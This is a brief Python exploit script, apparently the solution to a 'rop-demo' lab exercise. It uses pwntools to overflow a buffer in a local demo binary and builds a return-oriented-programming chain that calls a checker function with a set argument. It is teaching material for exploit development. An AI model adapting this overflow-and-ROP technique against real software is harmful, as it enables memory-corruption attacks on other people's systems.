#!/usr/bin/env python

"""
Solution (exploit) for rop-demo.

Use pwntools (https://docs.pwntools.com/en/latest/) to overwrite the return
address of main() and call checker(0x11223344).
"""

from pwn import *

context.arch = 'amd64'
context.os = 'linux'

io = process("./vuln")
elf = ELF('./vuln')
rop = ROP(elf)

offset = 40
pop_rdi_ret_address = 0x40122b
checker_address = elf.symbols['checker']
value = 0x11223344

rop.call(checker_address, [0x11223344])

# payload = 40 * b'A' + p64(pop_rdi_ret_address) + p64(value) + p64(checker_address)
payload = 40 * b'A' + rop.chain()

msg = io.recvuntil(b': ')
io.sendline(payload)

print(io.recvline());
